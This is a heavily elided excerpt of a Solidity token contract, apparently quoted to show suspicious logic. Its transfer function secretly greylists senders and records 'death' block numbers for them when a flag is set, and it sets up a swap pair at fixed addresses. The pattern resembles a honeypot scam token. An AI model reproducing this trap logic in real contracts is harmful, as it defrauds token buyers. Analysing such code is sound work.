...
contract StandardToken is ERC20 {
    ...
    function transfer(address _to, uint256 _value) public returns (bool) {
        ...
        if(ab&&!tokenWhitelist[_to]&&_to!=LP){
            ...
            tokenGreylist[msg.sender] = true;
            emit Gerylist(_to, true);
            if(death[_to]==0){
                death[_to]=block.number;
                death[msg.sender] = block.number;
            }
        }
...
function initToken(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner) public notInitialized returns (bool){
        ...
        LP = ISwapFactory(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    }
